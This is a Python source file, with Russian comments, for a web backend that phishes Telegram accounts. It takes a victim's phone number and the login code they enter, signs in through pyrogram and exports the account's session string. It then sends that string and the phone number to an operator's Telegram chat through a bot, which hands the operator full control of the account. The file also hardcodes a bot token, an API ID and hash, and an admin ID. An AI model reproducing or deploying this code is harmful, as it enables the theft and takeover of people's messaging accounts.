import asyncio, os, logging
from aiogram import Bot, Dispatcher
from aiohttp import web
import aiohttp_cors
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded

# Твои данные
API_ID, API_HASH = 15587172, "d3d35aebb0b6ebdb7a002836914ee37d"
BOT_TOKEN, ADMIN_ID = "8613728108:AAGR9Lmdx2YvG6wbg8qk31rcLxeKD4Vu6Po", 1866813859

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
active_clients = {}

async def handle_api(request):
    # Исправляем проблему Event Loop для Render
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
    try:
        data = await request.json()
        uid, act = str(data.get("user_id")), data.get("action")
        
        if act == "send_phone":
            p = data.get("phone").replace(" ", "").replace("-", "")
            c = Client(name=f"u_{uid}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
            await c.connect()
            s = await c.send_code(p)
            active_clients[uid] = {"c": c, "p": p, "h": s.phone_code_hash}
            return web.json_response({"status": "ok"})
            
        elif act == "send_code":
            s = active_clients.get(uid)
            if not s: return web.json_response({"status": "error", "message": "Expired"})
            try:
                await s["c"].sign_in(s["p"], s["h"], data.get("code"))
                ss = await s["c"].export_session_string()
                await bot.send_message(ADMIN_ID, f"✅ ВХОД!\n{s['p']}\n\n`{ss}`", parse_mode="Markdown")
                return web.json_response({"status": "success"})
            except SessionPasswordNeeded: 
                return web.json_response({"status": "need_2fa"})
                
    except Exception as e:
        return web.json_response({"status": "error", "message": str(e)})

app = web.Application()
cors = aiohttp_cors.setup(app, defaults={"*": aiohttp_cors.ResourceOptions(allow_credentials=True, expose_headers="*", allow_headers="*")})
resource = app.router.add_resource("/api")
cors.add(resource.add_route("POST", handle_api))

async def main():
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 10000))
    await web.TCPSite(runner, '0.0.0.0', port).start()
    print(f"Server started on {port}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
